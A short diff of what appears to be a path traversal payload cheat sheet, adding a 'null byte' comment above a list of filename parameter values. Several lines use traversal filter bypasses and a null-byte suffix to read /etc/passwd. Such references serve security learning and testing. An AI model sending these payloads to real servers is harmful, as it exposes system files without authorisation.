@@ -327,7 +327,7 @@ image?filename=..././..././..././etc/passwd
 image?filename=....\/....\/....\/etc/passwd
 
 image?filename=/var/www/images/../../../etc/passwd
-
+# null byte
 image?filename=../../../etc/passwd%00.jpg
 ```
 **url encoding**
